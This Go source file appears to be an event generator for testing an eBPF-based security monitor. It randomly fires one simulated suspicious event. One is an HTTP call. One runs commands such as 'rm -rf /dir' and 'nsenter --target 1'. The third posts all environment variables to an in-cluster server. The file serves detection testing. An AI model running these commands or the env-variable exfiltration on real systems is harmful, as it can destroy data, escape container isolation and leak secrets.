package app

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/castai/logging"
)

var (
	rnd *rand.Rand
)

func init() {
	rnd = rand.New(rand.NewSource(time.Now().Unix())) //nolint:gosec
}

func newEventRunner(log *logging.Logger) *eventRunner {
	return &eventRunner{
		log: log,
		events: []event{
			newEventRemoteHTTPCall(),
			newEventExecBinary(),
			newEventStealEnvVariables(),
		},
	}
}

type eventRunner struct {
	log    *logging.Logger
	events []event
}

func (er *eventRunner) run(ctx context.Context) error {
	ei := rnd.Intn(len(er.events))
	selectedEvent := er.events[ei]
	er.log.Debugf("running event, name=%s", selectedEvent.getName())
	if err := selectedEvent.run(ctx); err != nil {
		return fmt.Errorf("running event, name=%s: %w", selectedEvent.getName(), err)
	}
	wait := time.Minute
	er.log.Debugf("done, name=%s, waiting %v before exit", selectedEvent.getName(), wait)
	// Wait some time to ensure ebpf events are collected.
	time.Sleep(wait)
	return nil
}

type event interface {
	getName() string
	run(ctx context.Context) error
}

func newEventRemoteHTTPCall() *eventHTTPCall {
	return &eventHTTPCall{
		websites: []string{
			"google.com",
			"youtube.com",
			"facebook.com",
			"twitter.com",
			"instagram.com",
			"baidu.com",
			"wikipedia.org",
			"yahoo.com",
			"whatsapp.com",
			"amazon.com",
			"netflix.com",
			"yahoo.co.jp",
			"live.com",
			"zoom.us",
			"reddit.com",
			"vk.com",
			"office.com",
			"linkedin.com",
			"discord.com",
			"tiktok.com",
			"twitch.tv",
			"naver.com",
			"roblox.com",
			"bing.com",
			"pinterest.com",
		},
	}
}

type eventHTTPCall struct {
	websites []string
}

func (e *eventHTTPCall) getName() string {
	return "http-call"
}

func (e *eventHTTPCall) run(ctx context.Context) error {
	domain := e.websites[rnd.Intn(len(e.websites))]
	resp, err := http.Get(fmt.Sprintf("https://%s", domain)) //nolint:noctx
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func newEventExecBinary() *eventExecBinary {
	return &eventExecBinary{}
}

type eventExecBinary struct {
}

func (e *eventExecBinary) getName() string {
	return "exec"
}

func (e *eventExecBinary) run(ctx context.Context) error {
	cmds := [][]string{
		{"wget", "google.com"},
		{"apt", "list"},
		{"rm", "-rf", "/dir"},
		{"mount"},
		{"nsenter", "--target", "1"},
		{"nsenter", "--target", "1", "--pid"},
	}
	cmd := cmds[rnd.Intn(len(cmds))]
	out, err := exec.CommandContext(ctx, cmd[0], cmd[1:]...).CombinedOutput() //nolint:gosec
	if err != nil {
		return fmt.Errorf("%s:%w", string(out), err)
	}
	return nil
}

func newEventStealEnvVariables() *eventStealEnvVariables {
	return &eventStealEnvVariables{}
}

type eventStealEnvVariables struct {
}

func (e *eventStealEnvVariables) getName() string {
	return "steam-env-variables"
}

func (e *eventStealEnvVariables) run(ctx context.Context) error {
	envs := os.Environ()
	// TODO(patrick.pichler): This is broken for sure, either think about how to fix it, or delete it.
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, "http://kvisord-server.kvisord", strings.NewReader(strings.Join(envs, ",")))
	if err != nil {
		return err
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}
